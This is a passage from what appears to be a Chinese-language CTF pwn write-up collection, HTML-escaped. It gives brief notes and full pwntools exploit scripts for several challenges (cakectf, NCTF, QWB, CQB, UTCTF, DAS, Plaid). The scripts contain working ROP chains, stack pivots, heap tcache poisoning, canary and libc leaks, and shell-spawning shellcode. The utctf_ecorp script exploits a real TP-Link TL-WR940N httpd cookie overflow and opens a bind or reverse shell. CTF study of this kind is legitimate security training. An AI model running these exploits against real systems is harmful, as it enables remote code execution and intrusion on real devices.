payload=p64(win_addr)+p64(0)+p64(chk_fail)*0x30
io.sendlineafter(b&amp;quot;name? &amp;quot;,payload)

idx=((1&amp;lt;&amp;lt;31)+1)-(1&amp;lt;&amp;lt;32)

payload=str(idx)
io.sendlineafter(b&amp;quot;you? &amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_memorial_cabbage&#34;&gt;cakectf2023_memorial_cabbage:&lt;/h3&gt;
&lt;p&gt;gdb调试发现&lt;code&gt;memo_w&lt;/code&gt;只需&lt;code&gt;0xff0&lt;/code&gt;bytes的数据就可以覆盖到&lt;code&gt;tempdir&lt;/code&gt;，而限制输入长度为&lt;code&gt;0xfff&lt;/code&gt;，存在溢出可以覆盖&lt;code&gt;tempdir&lt;/code&gt;为&lt;code&gt;/flag.txt\x00&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./cabbage&amp;quot;)
io=remote(&amp;quot;memorialcabbage.2023.cakectf.com&amp;quot;,9001)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
payload=cyclic(0xff0)+b&amp;quot;/flag.txt\x00&amp;quot;
io.sendlineafter(b&amp;quot;Memo: &amp;quot;,payload)


io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;n1ctf_n1canary&#34;&gt;n1ctf_n1canary:&lt;/h3&gt;
&lt;p&gt;常规异常处理绕过canary(唬人的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./a&amp;quot;)

backdoor = 0x403387

gdb.attach(
    io, &#39;b *0x403405\nb *0x4037ee\nb *0x405128\nb *0x40512e\nb *0x404fd3\nb *0x404f6a&#39;)

payload = p64(0x4f4aa0)+p64(backdoor)
payload = payload.ljust(64, b&amp;quot;a&amp;quot;)
io.sendafter(b&amp;quot;canary\n&amp;quot;, payload)

io.sendlineafter(b&amp;quot;pwn :)\n&amp;quot;, cyclic(0x68)+p64(0x403407)+p64(0x4f4aa0)*8)
print(&amp;quot;offset:&amp;quot;, cyclic_find(0x6261616362616162))


io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;nctf_2021_login&#34;&gt;nctf_2021_login&lt;/h3&gt;
&lt;p&gt;栈迁移后利用csu改&lt;code&gt;close@got[plt]&lt;/code&gt;低字节为&lt;code&gt;\x99&lt;/code&gt;构造syscall&lt;br&gt;
之后ret到第二次read控制rax为&lt;code&gt;0x3b&lt;/code&gt;&lt;br&gt;
随后利用csu控制&lt;code&gt;rdx&lt;/code&gt;为0，构造&lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,0,0)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28857)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

ret=0x40101a
pop_rdi=0x401293
pop_rsi_r15=0x401291 
leave_ret=0x40121f
read_plt=elf.plt[b&amp;quot;read&amp;quot;]
read_got=elf.got[b&amp;quot;read&amp;quot;]
read_text=0x04011ed  

csu_1=0x40128a
# 0040128a  5b                 pop     rbx {__saved_rbx}
# 0040128b  5d                 pop     rbp {__saved_rbp}
# 0040128c  415c               pop     r12 {__saved_r12}
# 0040128e  415d               pop     r13 {__saved_r13}
# 00401290  415e               pop     r14 {__saved_r14}
# 00401292  415f               pop     r15 {__saved_r15}
# 00401294  c3                 retn     {__return_addr}

csu_2=0x401270
# 00401270  4c89f2             mov     rdx, r14
# 00401273  4c89ee             mov     rsi, r13
# 00401276  4489e7             mov     edi, r12d
# 00401279  41ff14df           call    qword [r15+rbx*8]

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;NCTF2021!\n&amp;quot;)

#offset 0x110
payload=cyclic(0x100)+p64(0x404400)+p64(read_text)
io.send(payload)


# pre-modify close_got and prepare for rop chain
payload=p64(csu_1)+p64(0)+p64(0x1)+p64(0)+p64(elf.got[b&amp;quot;close&amp;quot;])+p64(0x200)+p64(read_got)
payload+=p64(csu_2)+b&amp;quot;/bin/sh\x00&amp;quot;
payload=payload.ljust(0x78,b&amp;quot;a&amp;quot;)


payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x404800)*2+p64(elf.sym[b&amp;quot;read&amp;quot;])
payload+=p64(csu_1)+p64(0)*2+p64(0x404340)+p64(0)+p64(0)+p64(elf.got[b&amp;quot;close&amp;quot;])+p64(csu_2)


payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)+p64(0x404300-0x8)+p64(leave_ret)
io.send(payload)

# modify close_got
io.send(b&amp;quot;\x99&amp;quot;)

# trigger
sleep(3)
io.send(b&amp;quot;a&amp;quot;*0x3b)



io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040121f : leave ; ret
# 0x000000000040128c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040128e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401290 : pop r14 ; pop r15 ; ret
# 0x0000000000401292 : pop r15 ; ret
# 0x000000000040128b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040128f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040117d : pop rbp ; ret
# 0x0000000000401293 : pop rdi ; ret
# 0x0000000000401291 : pop rsi ; pop r15 ; ret
# 0x000000000040128d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;qwb2022_devnull&#34;&gt;qwb2022_devnull&lt;/h3&gt;
&lt;p&gt;栈迁移＋mprotect+shellcode&lt;br&gt;
注意fgets&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./devnull&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28934)
elf=ELF(&amp;quot;./devnull&amp;quot;)
libc=elf.libc

mprotect=0x4012D0
w_addr=0x3fe000
pop_rbp=0x40129d
leave_ret=0x401354
mov_eax=0x401350

# gdb.attach(io)
# pause()

payload=cyclic(0x20)
io.sendafter(b&amp;quot;filename\n&amp;quot;,payload)

payload=cyclic(0xc+8)+p64(w_addr)+p64(w_addr+0x10)+p64(leave_ret)
io.sendafter(b&amp;quot;discard\n&amp;quot;,payload)

read_shellcode=asm(&#39;&#39;&#39;
    xor rax,rax
    mov edi,0
    push 0x3fea00
    pop rsi
    push 0x200
    pop rdx
    syscall              
&#39;&#39;&#39;)

call_shellcode=asm(&#39;&#39;&#39;
mov rax,0x3fea00
call rax
&#39;&#39;&#39;)

payload=p64(0x3fe000)+p64(0x3fe018)*2+p64(mov_eax)+p64(mprotect)+p64(0xdeadbeef)+p64(0x3fe038)+read_shellcode+call_shellcode
io.sendafter(b&amp;quot;data\n&amp;quot;,payload)

# pause()

io.send(asm(shellcraft.sh()))

io.interactive()

# 0x0000000000401354: leave; ret;
# 0x000000000040101a: ret;
# 0x0000000000401351: mov eax, dword ptr [rbp - 0x18]; leave; ret;
# 0x000000000040129d: pop rbp; ret;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cqb_nmanager&#34;&gt;cqb_nmanager:&lt;/h3&gt;
&lt;p&gt;溢出绕过随机验证，栈上越界读写ROP&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./nmanager&amp;quot;)
# io=remote(&amp;quot;127.0.0.1&amp;quot;,1234)
io=remote(&amp;quot;8.147.135.190&amp;quot;,44768)
elf=ELF(&amp;quot;./nmanager&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

ret=0x40101a

def modify(n,gd,age,name):
    io.sendlineafter(b&amp;quot;modify ##\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;gender: &amp;quot;,gd)
    io.sendlineafter(b&amp;quot;age: &amp;quot;,str(age))
    io.sendafter(b&amp;quot;name: &amp;quot;,name)

def choice(n):
    if n == 0:
        io.sendafter(b&amp;quot;quit now?(Y/y)\n&amp;quot;,b&amp;quot;n&amp;quot;)
    else:
        io.sendafter(b&amp;quot;quit now?(Y/y)\n&amp;quot;,b&amp;quot;y&amp;quot;)
        

payload=b&amp;quot;./flag\x00\x00&amp;quot;+cyclic(0x58)+b&amp;quot;check passed&amp;quot;.ljust(0x20,b&amp;quot;\x00&amp;quot;)
io.sendlineafter(b&amp;quot;password: &amp;quot;,payload)


### leak libc
modify(8,b&amp;quot;nmsl&amp;quot;*2,0x10,b&amp;quot;aaa&amp;quot;)
io.recvuntil(b&amp;quot;nmsl&amp;quot;*2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x29d90
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

choice(0)


### leak canary
modify(-1,b&amp;quot;a&amp;quot;,0x10,b&amp;quot;aaa&amp;quot;)
io.recvuntil(b&amp;quot;gender: a&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))

choice(0)

### rop
payload=p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)
modify(-1,payload,str_sh,p64(sys_addr))

choice(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cqb_book&#34;&gt;cqb_book&lt;/h3&gt;
&lt;p&gt;2.35，白给uaf，函数齐全，这里选择堆栈结合打rop，IO没好的模板实在不想看&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;8.147.135.190&amp;quot;,13854)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size :&amp;quot;,str(s))


def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))


def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;content: &amp;quot;,cc)


# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x90)
    
add(8,0x10)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

pop_rdi=leak_addr+0x2a3e5
# 0x000000000002a3e5: pop rdi; ret;
ret=leak_addr+0xf9e3c
# 0x00000000000f9e3c: ret;
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]

show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr:  &amp;quot;+hex(heap_addr))


payload=p64(environ^key)+p64(0)
edit(4,payload)

add(4,0x90)
add(5,0x90)
add(6,0x90)
add(7,0x90)
show(7)

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

ret_addr=stack_addr-0x188
# stack_addr 0x7fffffffdee8
# ret 0x7fffffffdda8

payload=p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)

for i in range(8,13):
    add(i,0x100)

for i in range(8,12):
    delete(i)

edit(11,p64(ret_addr^key))
add(8,0x100)

# gdb.attach(io)
# pause()

add(9,0x100)
edit(9,cyclic(0x28)+payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;utctf_webserver&#34;&gt;utctf_webserver&lt;/h3&gt;
&lt;p&gt;分析过了，直接贴码&lt;br&gt;
溢出导致的栈上参数可控写got指针，任意地址写堆地址，lowbyte写&lt;code&gt;\x00&lt;/code&gt;，改&lt;code&gt;strstr&lt;/code&gt;为&lt;code&gt;strtol&lt;/code&gt;&lt;br&gt;
vuln:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int header_count = 0;
int header_cap = 0;
struct Header *headers = NULL;
char *name = take_until_char(header_line, &amp;amp;index, &#39;:&#39;);
char *value = take_until_newline(header_line, &amp;amp;index);
name = malloc_str(name);
value = malloc_str(value);

//skip this
if (header_count + 1 &amp;gt; header_cap) {
    int new_cap = header_cap &amp;lt; 4 ? 4 : header_cap * 2;
    headers = realloc(headers, sizeof(struct Header) * new_cap);
    header_cap = new_cap;
}

struct Header h;   # control h -&amp;gt; got_ptr
h.name = name;  # got1 -&amp;gt; heap_addr1
h.value = value; # got2 -&amp;gt; heap_addr2
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./webserver&amp;quot;)
# io = remote(&amp;quot;guppy.utctf.live&amp;quot;, 5848)

io.send(b&amp;quot;GET /flag.txt HTTP/1.1\r\n&amp;quot;)
#
gdb.attach(io)
pause()

headers = b&amp;quot;1:1\x00&amp;quot;  # prepare for overflow &amp;amp;&amp;amp; make heap addr

payload = headers

# skip if condition
payload += b&amp;quot;\x01&amp;quot;*(0x350-0x30-len(headers))

# 0x402380 &amp;lt;main+665&amp;gt;    mov    rax, qword ptr [rbp - 0x30]
# ...
# 0x402399 &amp;lt;main+690&amp;gt;    mov    qword ptr [rcx + 8], rdx    &amp;lt;exit@got[plt]+1&amp;gt;
payload += p64(0x4050e0-0xf)  # rcx

payload += b&amp;quot;\r\n&amp;quot;
payload += b&amp;quot;\r\n&amp;quot;
io.send(payload)

io.send(b&amp;quot;a&amp;quot;*0x20000)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;utctf_ecorp&#34;&gt;utctf_ecorp&lt;/h3&gt;
&lt;p&gt;ref:&lt;br&gt;
&lt;a href=&#34;https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/&#34;&gt;https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://blog.talosintelligence.com/vulnerability-deep-dive-tp-link/&#34;&gt;https://blog.talosintelligence.com/vulnerability-deep-dive-tp-link/&lt;/a&gt;&lt;br&gt;
题目给出的固件版本对应第一篇中固件版本，headers中的cookie存在缓冲区溢出，故该漏洞可以直接打&lt;br&gt;
题目要求需要反弹shell&lt;br&gt;
题目给出固定的栈地址，并且admin给出提示&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Nope you can just jump to shellcode On a real router u would have needed to rop to sleep or flush the cache another way Or find a way to write ur code without a decoder...u don&#39;t need to deal with cache coherence unless ur code modifies itself
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不需要考虑cache incohorency，直接跳转执行shellcode&lt;br&gt;
不过该漏洞触发时会调用&lt;code&gt;toUpper()&lt;/code&gt;将小写字母转换为大写字母&lt;br&gt;
stage1考虑构造&lt;code&gt;read&lt;/code&gt;绕过，&lt;code&gt;read(socketfd,buf,size)&lt;/code&gt;&lt;br&gt;
&lt;code&gt;shellcraft&lt;/code&gt;中的&lt;code&gt;findpeer&lt;/code&gt;可以直接将&lt;code&gt;socketfd&lt;/code&gt;存入&lt;code&gt;$s0&lt;/code&gt;中&lt;br&gt;
stage2读入反弹shell的shellcode，这里方法不唯一，包括但不限于&lt;br&gt;
&lt;code&gt;bindsh&lt;/code&gt; &amp;amp; &lt;code&gt;connect+dupsh&lt;/code&gt; &amp;amp; &lt;code&gt;findpeersh&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(arch=&#39;mips&#39;, endian=&#39;big&#39;, os=&#39;linux&#39;)

nop = asm(&#39;addiu $a0, $a0, 0x4141&#39;)
avoid = string.ascii_lowercase.encode() + b&amp;quot;\x00&amp;quot;
addr = 0x7c7ffa90

# sh = listen(1440)
io = remote(&#39;192.168.0.1&#39;, 80)

# stage 1
# find peer socketfd and save it to $s0
sc = asm(shellcraft.findpeer(io.lport))
# read sc2 to addr
sc += asm(shellcraft.read(&#39;$s0&#39;, addr, 0x200))
sc += asm(f&#39;&#39;&#39;
    lui $t9, {addr &amp;gt;&amp;gt; 16}
    ori $t9, $t9, {addr &amp;amp; 0xffff}
    jalr $t9
    addiu $a0, $a0, 0x4141
&#39;&#39;&#39;)

print(&amp;quot;sc::&amp;quot;, sc)


assert all(c not in avoid for c in sc)


payload = b&amp;quot;A&amp;quot;*0x10+p32(addr)+nop*100+sc

request = b&amp;quot;GET /loginFs/passwd HTTP/1.1\r\n&amp;quot;
request += b&amp;quot;Host: 192.168.0.1\r\n&amp;quot;
request += b&amp;quot;Referer: http://192.168.0.1/\r\n&amp;quot;
request += b&amp;quot;Cookie: &amp;quot;+payload+b&amp;quot;\r\n&amp;quot;
request += b&amp;quot;Upgrade-Insecure-Requests: 1\r\n&amp;quot;
request += b&amp;quot;\r\n&amp;quot;

io.send(request)

pause()

# stage 2
# sc2 = asm(shellcraft.findpeersh(io.lport))
# sc2 = asm(shellcraft.connect(&amp;quot;192.168.0.2&amp;quot;, 1440))+asm(shellcraft.dupsh())
sc2 = asm(shellcraft.bindsh(1440))

io.send(sc2)

io.interactive()

# sh.wait_for_connection()
# sh.interactive()
log.progress(&amp;quot;connecting to shell&amp;quot;)
sh1 = remote(&amp;quot;192.168.0.1&amp;quot;, 1440)
sh1.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dam_add1&#34;&gt;dam_add1:&lt;/h3&gt;
&lt;p&gt;主函数while循环，输入字母触发&lt;code&gt;stoi&lt;/code&gt;异常处理退出循环，覆盖&lt;code&gt;rbp&lt;/code&gt;为可写地址，&lt;code&gt;ret&lt;/code&gt;为&lt;code&gt;landingpad+1&lt;/code&gt;&lt;br&gt;
寻找&lt;code&gt;landingpad&lt;/code&gt;一般方法:&lt;br&gt;
Look around in &lt;code&gt;libstdc++&lt;/code&gt; for a &lt;code&gt;catch&lt;/code&gt; block that just ignores the exception and returns from its function: &lt;a href=&#34;https://github.com/gcc-mirror/gcc/blob/4b8e7b57d952a1031b0fe11533ef76b9821432c0/libstdc%2B%2B-v3/src/c%2B%2B98/ios_init.cc#L144&#34;&gt;https://github.com/gcc-mirror/gcc/blob/4b8e7b57d952a1031b0fe11533ef76b9821432c0/libstdc%2B%2B-v3/src/c%2B%2B98/ios_init.cc#L144&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A good way to narrow down the search space is to search for references to &lt;code&gt;__cxa_end_catch&lt;/code&gt;, which is called by &lt;code&gt;catch&lt;/code&gt; blocks that do not rethrow the exception.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./add1&amp;quot;)
elf = ELF(&amp;quot;./add1&amp;quot;)
libc = elf.libc


def add(cc):
    io.sendlineafter(b&amp;quot;Enter a number: &amp;quot;, cc)

# gdb.attach(io, &#39;b *0x555555569db7&#39;)
# gdb.attach(io)
# pause()


# leak canary
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x18
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x18)
canary = u64(io.recv(7).rjust(8, b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))

# leak libc_base
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x37
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x37)
libc_base = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;)) - 0x29d90
log.success(&amp;quot;libc_base: &amp;quot;+hex(libc_base))

# leak elf_base
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x47
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x47)
elf_base = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;)) - 0x157a5
log.success(&amp;quot;elf_base: &amp;quot;+hex(elf_base))

# leak stack_addr
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x57
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x57)
stack_addr = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))


ogg = libc_base+0xebc88
target = elf_base + 0x000b3ed4
pop_rsi = libc_base+0x000000000002be51
pop_rdx_r12 = libc_base+0x000000000011f2e7
landingpad = elf_base + 0x17731

# 0x55555556acb7 &amp;lt;__cxa_throw+55&amp;gt;    call   _Unwind_RaiseException@plt                &amp;lt;_Unwind_RaiseException@plt&amp;gt;
# gdb.attach(io, &#39;b *$rebase(0x16cb7)&#39;)
gdb.attach(io)

payload = cyclic(0x30)+p64(stack_addr) + \
    p64(landingpad+1)+p64(0xdeadbeef)+p64(pop_rdx_r12) + \
    p64(0)*2+p64(pop_rsi)+p64(0)+p64(ogg)
print(f&amp;quot;offset:{cyclic_find(0x6161616461616163)}&amp;quot;)  # offset: 8

add(payload)

io.interactive()

# 0x50a47 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebc81 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebc85 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebc88 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebce2 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebd3f execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebd43 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;das_exception&#34;&gt;das_exception:&lt;/h3&gt;
&lt;p&gt;劫持main返回地址，正常栈回退可以getshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./exception&amp;quot;)
# io = remote(&amp;quot;node5.buuoj.cn&amp;quot;, 27319)
elf = ELF(&amp;quot;./exception&amp;quot;)
libc = elf.libc


io.sendafter(b&amp;quot;name\n&amp;quot;, b&amp;quot;%7$p.%9$p.%11$p.&amp;quot;)
canary = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)
base_addr = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)-0x1480
leak_addr = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)-0x24083
log.success(&amp;quot;canary: &amp;quot;+hex(canary))
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

io.recvuntil(b&amp;quot;stack\n&amp;quot;)
stack_addr = int(io.recvuntil(b&amp;quot;\n&amp;quot;, drop=True), 16)
log.success(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

gdb.attach(io, &#39;b *0x7ffff7ddb093&#39;)

ogg = leak_addr+0xe3afe
pop_rdi = leak_addr+0x0000000000023b6a
pop_r12 = leak_addr+0x00000000001143a1
str_sh = leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr = leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload = b&amp;quot;a&amp;quot;*0x68+p64(canary) + \
    p64(stack_addr+0xa0)+p64(base_addr+0x1408) + \
    p64(canary)*5+p64(pop_r12)+p64(0)+p64(ogg)

# payload = b&amp;quot;aaaaaaaa&amp;quot;

io.sendafter(b&amp;quot;exception?\n&amp;quot;, payload)

io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;plaid_valor-not&#34;&gt;plaid_valor-not:&lt;/h3&gt;
&lt;p&gt;off-by-one+oob，直接看源码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

# io = process(&amp;quot;./valor-not&amp;quot;)
io = remote(&amp;quot;valornt.chal.pwni.ng&amp;quot;, 1337)
elf = ELF(&amp;quot;./valor-not&amp;quot;)


def conf():
    # io.sendlineafter(b&amp;quot;n): &amp;quot;, b&amp;quot;y&amp;quot;)
    io.sendline(b&amp;quot;y&amp;quot;)


# gdb.attach(io)
# pause()
# bypass cheater_checker
io.sendlineafter(b&amp;quot;Choose your weapon: \n&amp;quot;, b&amp;quot;3&amp;quot;)
conf()
io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x50+b&amp;quot;cheater&amp;quot;)
conf()
io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x64+p64(1))

# padding
for i in range(6):
